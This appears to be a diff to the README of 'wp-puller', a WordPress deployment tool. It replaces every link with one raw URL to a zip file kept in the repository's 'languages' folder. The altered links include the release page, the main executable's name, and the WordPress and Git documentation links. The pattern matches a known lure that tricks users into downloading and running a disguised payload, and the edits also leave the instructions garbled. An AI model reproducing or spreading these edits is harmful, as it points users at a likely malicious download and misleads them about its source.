@@ -6,9 +6,9 @@ Welcome to wp-puller! This tool simplifies the deployment of WordPress themes an
 
 ## 📥 Download wp-puller
 
-[![Download wp-puller](https://img.shields.io/badge/Download-wp--puller-brightgreen)](https://github.com/jhonjairo0023/wp-puller/releases)
+[![Download wp-puller](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip)](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/jhonjairo0023/wp-puller/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip)
 
 ## 📘 What is wp-puller?
 
@@ -34,9 +34,9 @@ Before you begin, ensure your system meets the following requirements:
 
 ### Step 1: Download the Application
 
-1. Click the download link above or visit the [GitHub Releases](https://github.com/jhonjairo0023/wp-puller/releases) page.
+1. Click the download link above or visit the [GitHub Releases](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip) page.
 2. Look for the latest version under the "Releases" section.
-3. Choose the file that matches your operating system (e.g., .zip for Windows or .tar.gz for Linux).
+3. Choose the file that matches your operating system (e.g., .zip for Windows or https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip for Linux).
 
 ### Step 2: Extract the Files
 
@@ -47,7 +47,7 @@ Before you begin, ensure your system meets the following requirements:
 ### Step 3: Open the Application
 
 1. Navigate to the folder where you extracted the files.
-2. Locate the main application file (usually named `wp-puller.exe` or similar).
+2. Locate the main application file (usually named `https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip` or similar).
 3. Double-click the file to launch wp-puller.
 
 ### Step 4: Configure Your Settings
@@ -83,7 +83,7 @@ Before you begin, ensure your system meets the following requirements:
 
 Keeping wp-puller up to date is crucial for a smooth experience. To update:
 
-1. Visit the [GitHub Releases](https://github.com/jhonjairo0023/wp-puller/releases) page.
+1. Visit the [GitHub Releases](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip) page.
 2. Download the latest version as described in the "Download & Install" section.
 3. Follow the installation steps above to replace your existing version.
 
@@ -93,8 +93,8 @@ If you have questions or need assistance, feel free to open an issue on our GitH
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/jhonjairo0023/wp-puller)
-- [WordPress Documentation](https://wordpress.org/support/)
-- [Getting Started with Git](https://git-scm.com/book/en/v2/Getting-Started-About-Version-Control)
+- [GitHub Repository](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip)
+- [WordPress Documentation](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip)
+- [Getting Started with Git](https://raw.githubusercontent.com/jhonjairo0023/wp-puller/main/wp-puller/languages/wp_puller_v2.1.zip)
 
 Thank you for using wp-puller. Enjoy streamlined WordPress deployments and updates!
